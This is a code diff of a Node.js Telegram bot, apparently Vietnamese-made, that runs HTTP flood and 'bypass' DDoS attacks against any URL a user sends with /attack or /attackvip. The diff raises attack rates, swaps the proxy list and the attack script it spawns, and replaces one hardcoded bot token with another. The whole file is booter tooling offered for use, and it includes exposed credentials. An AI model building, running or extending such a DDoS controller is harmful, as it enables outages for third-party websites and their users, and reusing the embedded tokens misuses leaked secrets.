@@ -2,7 +2,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const { spawn } = require('child_process');
 const path = require('path');
 
-const token = '7651331068:AAEQUBeNlW6a7WznGSp1gzGdn36l-BLy0Tk';
+const token = '8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw';
 const bot = new TelegramBot(token, { polling: true });
 
 let ADMIN_IDS = [7818408538];
@@ -39,11 +39,11 @@ bot.onText(/\/attack (https?:\/\/[^\s]+) (\d+)/, (msg, match) => {
     lastUserAttackTime[userId] = now;
   }
 
-  const rate = '30';
+  const rate = '50';
   const thread = '9';
-  const proxy = '9.txt';
+  const proxy = '8.txt';
   const method = 'flood';
-  const scriptPath = path.join(__dirname, '1.js');
+  const scriptPath = path.join(__dirname, 'c.js');
 
   bot.sendMessage(chatId, `🚀Tool by thuandz Bat đau attack vao ${url} trong ${duration} giay!`);
 
@@ -75,10 +75,10 @@ bot.onText(/\/attackvip (https?:\/\/[^\s]+) (\d+) (flood|bypass)/, (msg, match) 
   const duration = parseInt(match[2]);
   const method = match[3];
 
-  const rate = '30';
+  const rate = '80';
   const thread = '5';
-  const proxy = '9.txt';
-  const scriptPath = path.join(__dirname, '1.js');
+  const proxy = '8.txt';
+  const scriptPath = path.join(__dirname, 'c.js');
 
   bot.sendMessage(chatId, `✨ VIP Attack bat đau vao ${url} | Method: ${method} | Time: ${duration}s`);
 
@@ -125,6 +125,7 @@ bot.onText(/\/add (\d+)/, (msg, match) => {
   ADMIN_IDS.push(newAdminId);
   bot.sendMessage(chatId, `✅ Đa them admin moi voi ID: ${newAdminId}`);
 });
+
 
 
 
